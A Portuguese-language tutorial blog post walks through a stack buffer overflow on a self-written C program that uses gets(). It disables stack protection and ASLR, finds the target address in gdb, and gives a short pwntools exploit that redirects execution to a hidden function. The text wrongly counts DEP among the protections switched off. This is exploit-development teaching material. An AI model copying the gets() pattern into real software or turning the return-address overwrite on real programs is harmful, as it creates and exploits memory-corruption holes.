---
title: "Buffer Overflow na prática"
author: "slayer"
---

# O que é buffer overflow?

Buffer overflow (BOF) é uma das vulnerabilidades mais conhecidas e historicamente significativas no mundo da cibersegurança. Ele ocorre quando um programa escreve mais dados em um buffer do que ele pode armazenar, causando corrupção de memória. Essa falha pode ser explorada por pentesters para executar código arbitrário, modificar o comportamento do programa ou causar um crash.

Apesar da introdução de mecanismos modernos de segurança, como ASLR e stack canaries, o buffer overflow continua sendo um tópico crítico no desenvolvimento de exploits e pentesting. Compreender como o BOF funciona, como detectá-lo e explorá-lo é essencial.

Neste artigo, criaremos um programa simples em C, propositalmente vulnerável, e um exploit em Python.

# Mãos à obra!

Vamos lá! Para este artigo simples, criei um código em C para praticarmos:

```c
#include <stdio.h>
#define _GNU_SOURCE
#include <string.h>

void secret() {
    printf("BOF explorado
");
}

void funcvuln() {
    char buffer[64];
    printf("input: ");
    gets(buffer);
}

int main() {
    funcvuln();
    printf(".
");
    return 0;
}
```

Este código é vulnerável a BOF devido ao uso da função `gets()`, que não realiza verificações de limite sobre a entrada fornecida. A função `gets()` lê a entrada do usuário e a armazena no buffer `char buffer[64]`. No entanto, ela não verifica o tamanho da entrada. Se o input exceder os 64 bytes alocados, ele sobrescreverá locais adjacentes da memória, o que pode levar a um comportamento imprevisível, incluindo a capacidade de sobrescrever o endereço de retorno da função `funcvuln()`. Se o usuário inserir mais de 64 caracteres, os caracteres extras transbordarão o `buffer` e poderão sobrescrever o endereço de retorno salvo na pilha. Isso pode permitir que um invasor controle o fluxo do programa, redirecionando a execução para a função `secret()`, que imprime `BOF explorado`!

Para compilar o código de forma que ele permaneça vulnerável ao BOF, precisamos garantir que as proteções modernas do compilador, como SSP, DEP e ASLR, estejam desativadas: `gcc -fno-stack-protector -z noexecstack -std=gnu99 -o bof bof.c`

Após compilar o binário, podemos ver que uma mensagem de aviso aparece!

![Erro gcc](../../img/images/slayer/bof/error_gcc.png)

Também devemos desativar o ASLR para nossa sessão atual: `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`

Agora, vamos finalmente explorar o BOF!

# Exploração!

Mãos à obra! Vamos usar o gdb para analisar o binário e entender melhor como ele se comporta na memória. Isso nos ajudará a encontrar o deslocamento correto para sobrescrever a função de retorno: `gdb ./bof`

A primeira coisa que fiz ao iniciar o gdb foi usar `info functions` para listar as funções presentes no binário:

![Comando](../../img/images/slayer/bof/info_command.png)

Agora que encontramos os endereços das funções, vamos disparar o BOF e ver se há alguma alteração:

![Comando](../../img/images/slayer/bof/BOOM.png)

eee... BOOM! Transbordamos o buffer e recebemos um `Segmentation fault.`! Depois disso, listamos as funções novamente...

![Comando](../../img/images/slayer/bof/secret.png)

BOOYHA! O endereço da função que antes era `0x0000000000001159` agora se tornou `0x555555555159`! Usaremos esse novo endereço para explorar! Para isso, criaremos um exploit onde um payload será enviado, ultrapassando o tamanho do buffer e sobrescrevendo o endereço de retorno da função `funcvuln()`:

```py
from pwn import *

address = p64(0x0000555555555159)
payload = b"A" * 72 + address
p = process("./bof")
p.sendline(payload)
p.interactive()
```

E aí está o exploit. Mas vamos entender como ele funciona! Primeiro, ele importa as funções do pwntools e define o endereço da função `secret()`. A função `p64()` converte o endereço para o formato de 64 bits, pois em sistemas de 64 bits, os endereços de memória têm 8 bytes.

Após definir e converter o endereço, criamos o payload. `b"A" * 72` cria uma string de 72 bytes contendo `'A'` para preencher a pilha até o ponto onde o endereço de retorno da função `funcvuln()` está armazenado, e `+ address` adiciona o endereço da função `secret()` no final, substituindo o endereço de retorno de `funcvuln()`.

Agora que o exploit foi explicado, VAMOS EXPLORAR!

![Comando](../../img/images/slayer/bof/exploited.png)

E como esperado, conseguimos explorar este BOF! Este é um exemplo bem básico, apenas para demonstrar a lógica prática de como um ataque de buffer overflow pode acontecer ;)

